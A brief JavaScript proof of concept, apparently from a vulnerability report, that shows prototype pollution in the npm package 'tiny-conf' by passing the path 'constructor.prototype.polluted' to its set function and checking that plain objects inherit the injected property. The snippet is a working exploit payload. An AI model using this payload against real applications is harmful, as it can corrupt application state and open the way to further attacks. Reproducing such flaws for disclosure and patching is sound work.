var obj = {};
obj.__proto__.polluted = undefined;
Object.defineProperty(obj, '__proto__', {
    value: obj.__proto__,
    writable: true,
    enumerable: true,
    configurable: true
});
const tinyConf = require('tiny-conf');
obj = {};
console.log({}.polluted);
tinyConf.set('constructor.prototype.polluted', 'yes');
console.log({}.polluted);